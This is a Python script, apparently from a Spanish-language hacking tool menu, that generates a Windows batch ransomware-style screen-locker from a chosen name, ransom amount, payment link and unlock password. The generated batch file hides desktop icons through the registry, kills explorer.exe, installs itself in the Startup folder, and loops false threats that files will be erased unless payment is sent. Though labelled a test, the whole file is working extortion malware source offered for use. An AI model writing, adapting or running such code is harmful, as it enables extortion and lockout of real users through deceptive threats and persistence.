import os
import random
from complemets import color, Banner



def display_menu():
    print(random.choice(Banner.list_baner))

def clear_screen():
    ##clear screen for windows
    clear = "cls"
    os.system(clear)
    display_menu()

def ramsomware():
    #limpiar pantalla
    clear_screen()
    
    print(f'''{color.GREEN}TE ENCUENTRAS EN EL CREADOR DE RAMSOMWARE DE PRUEBA\n
SOLO NECESITAMOS UNOS DATOS PAR FINALIZAR''')
    

    nameram = input(f"{color.BLUE}Nombre del Ramsomware: {color.PURPLE} \n")
    pay = input(f"{color.BLUE}Cantidad a pagar: {color.PURPLE} \n")
    URL = input(f"{color.BLUE}Enlace de pago(De preferencia usa un acortador URL):{color.PURPLE} \n")
    passw= input(f"{color.BLUE}Contraseña de desbloqueo: {color.PURPLE} \n")
    
    ##Creation of malwar ramsomware
    ##archivo = open(f"{nameram}.bat", 'w')
    
    base_dir = os.path.dirname(os.path.abspath(__file__))  # Directorio del archivo actual (complements)
    creaciones_dir = os.path.join(base_dir, '..', 'Malwares')  # Navega hacia mvpy/creaciones
    file_path = os.path.join(creaciones_dir, f'{nameram}.bat')
    
    archivo = open(file_path, 'w')
    archivo.write('@echo off\n')
    archivo.write('color 4\n')
    archivo.write('mode con: cols=150 lines=50\n')
    archivo.write('title HACKED\n')

    archivo.write(':: Ejecuta PowerShell para ocultar los iconos del escritorio\n')
    archivo.write('''powershell -command "& { $key = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced'; Set-ItemProperty -Path $key -Name 'HideIcons' -Value 1; Stop-Process -Name explorer -Force }"\n''')



    archivo.write(':: Crear la carpeta "rmlog" en el disco C: si no existe \n')
    archivo.write('''if not exist C:\rmlog (\n''')
    archivo.write('''    mkdir C:\rmlog\n''')
    archivo.write(''')\n''')

    archivo.write(':: Obtener la fecha y hora actuales\n')
    archivo.write('''set fecha=%date%\n''')
    archivo.write('''set hora=%time%\n''')

    archivo.write(''':: Crear el archivo de registro con la fecha y hora en C:\rmlog \n''')
    archivo.write('''echo Fecha de ejecución: %fecha%%hora%>> C:\rmlog\log.txt \n''')


    archivo.write('taskkill /f /im explorer.exe\n')

    archivo.write(':: Obtiene la ruta completa de este script\n')
    archivo.write('set "scriptPath=%~dp0%~nx0"\n')

    archivo.write(':: Define la ruta del escritorio\n')
    archivo.write('''set "desktopPath=%UserProfile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"\n''')

    archivo.write(':: Define el nombre del acceso directo\n')
    archivo.write('set "shortcutName=ramso.lnk"\n')

    archivo.write(':: Crea el acceso directo usando PowerShell\n')
    archivo.write('powershell -Command ^\n')
    archivo.write('"$WScriptShell = New-Object -ComObject WScript.Shell; ^\n')
    archivo.write('''$Shortcut = $WScriptShell.CreateShortcut('%desktopPath%\%shortcutName%'); ^\n''')
    archivo.write('''$Shortcut.TargetPath = '%scriptPath%'; ^\n''')
    archivo.write('''$Shortcut.WorkingDirectory = '%~dp0'; ^\n''')
    archivo.write('''$Shortcut.WindowStyle = 1; ^\n''')
    archivo.write('''$Shortcut.Save()"\n''')

    archivo.write(':ciclo\n')
    archivo.write('cls\n')
    archivo.write('color 4\n')
    archivo.write('msg * LEE CON ATENCION!.\n')
    archivo.write('msg * NO REINICIES TU COMPUTADORA\n')
    archivo.write('msg * AL REINICIAR TU COMPUTADORA SE BORRARAN TODOS TUS ARCHIVOS\n')
    archivo.write('msg * NO CIERRE LA VENTANA!!\n')
    archivo.write('msg * SI CIERRA LA VENTA PERDERA SU COMPUTADORA Y NO PODRA RECUPERARLA\n')
    archivo.write(f'msg * ENVIE ${pay} DOLARES PARA CONSEGUIR LA CLAVE\n')
    archivo.write('msg * ESCRIBE EL SIGUIENTE LINK EN TU CELULAR\n')
    archivo.write(f'msg * "{URL}"\n')
    archivo.write('echo ===============================================================================\n')
    archivo.write('echo                  uuuuuuu\n')
    archivo.write('echo              uu$$$$$$$$$$$uu\n')
    archivo.write('echo           uu$$$$$$$$$$$$$$$$$uu\n')
    archivo.write('echo          u$$$$$$$$$$$$$$$$$$$$$u\n')
    archivo.write('echo         u$$$$$$$$$$$$$$$$$$$$$$$u\n')
    archivo.write('echo        u$$$$$$$$$$$$$$$$$$$$$$$$$u\n')
    archivo.write('echo        u$$$$$$$$$$$$$$$$$$$$$$$$$u\n')
    archivo.write('echo        u$$$$$$$   $$$$$   $$$$$$$u\n')
    archivo.write('echo        "$$$$"      u$u       $$$$\n')
    archivo.write('echo         $$$u       u$u       u$$$\n')
    archivo.write('echo         $$$u      u$$$u      u$$$\n')
    archivo.write('echo          "$$$$uu$$$   $$$uu$$$$"\n')
    archivo.write('echo           "$$$$$$$"   "$$$$$$$"\n')
    archivo.write('echo             u$$$$$$$u$$$$$$$u\n')
    archivo.write('echo              u$"$"$"$"$"$"$u\n')
    archivo.write('echo   uuu        $$u$ $ $ $ $u$$       uuu\n')
    archivo.write('echo  u$$$$        $$$$$u$u$u$$$       u$$$$\n')
    archivo.write('echo   $$$$$uu      "$$$$$$$$$"     uu$$$$$$\n')
    archivo.write('echo u$$$$$$$$$$$uu    """"    uuuu$$$$$$$$$$\n')
    archivo.write('echo $$$$"""$$$$$$$$$$uuu   uu$$$$$$$$$"""$$$\n')
    archivo.write('echo  """      ""$$$$$$$$$$$uu ""$"""\n')
    archivo.write('echo            uuuu ""$$$$$$$$$$uuu\n')
    archivo.write('echo   u$$$uuu$$$$$$$$$uu ""$$$$$$$$$$$uuu$$$\n')
    archivo.write('echo   $$$$$$$$$$""""           "$$$$$$$$$$$"\n')
    archivo.write('echo    "$$$$$"                      ""$$$$""\n')
    archivo.write('echo      $$$"                         $$$$"\n')         

    archivo.write('echo ===============================================================================\n')
    archivo.write('echo  NO REINICIES TU COMPUTADORA\n')
    archivo.write('echo  AL REINICIAR TU COMPUTADORA SE BORRARAN TODOS TUS ARCHIVOS\n')
    archivo.write('echo  NO CIERRE LA VENTANA\n')
    archivo.write('echo  SI CIERRA LA VENTA PERDERA SU COMPUTADORA Y NO PODRA RECUPERARLA\n')
    archivo.write(f'echo  ENVIE ${pay} DLLS PARA CONSEGUIR LA CLAVE\n')
    archivo.write('echo  ESCRIBE ESTE LINK EN TU CELULAR\n')
    archivo.write(f'echo  "{URL}" \n')
    archivo.write('echo ===============================================================================\n')
    archivo.write('set /p pass=Escriba la clave de recuperacion: \n')
    archivo.write(f'if %pass%=={passw} (goto libre) ELSE (goto ciclo)\n')

    archivo.write(':libre\n')
    archivo.write('color 2\n')
    archivo.write('echo gracias por la coperacion\n')
    archivo.write('@echo off\n')


    archivo.write(':: Ejecuta PowerShell para mostrar los iconos del escritorio\n')
    archivo.write('''::powershell -command "& { $key = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced'; Set-ItemProperty -Path $key -Name 'HideIcons' -Value 0; Stop-Process -Name explorer -Force }"\n''')

    archivo.write('''del "%UserProfile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ramso.lnk"''')
    archivo.write('start explorer.exe\n')
    archivo.write('echo para mostrar sus ARCHIVOS\n')
    archivo.write('"echo Click derecho --> ver --> mostrar iconos"\n')

    archivo.write('"msg * Click derecho --> ver --> mostrar iconos"\n')

    archivo.write('timeout /t 5 /nobreak\n')
    archivo.write('exit\n')

    archivo.close()
    if os.path.exists(file_path):
        print(f"{color.GREEN}El archivo '{file_path}' Secreo correctamente.")
        input(f"{color.BLUE}preciona enter para continuar")
    else:
        print(f"{color.RED}El archvio '{file_path}' Tubo un error en su creacion")
        input(f"{color.BLUE}preciona enter para continuar")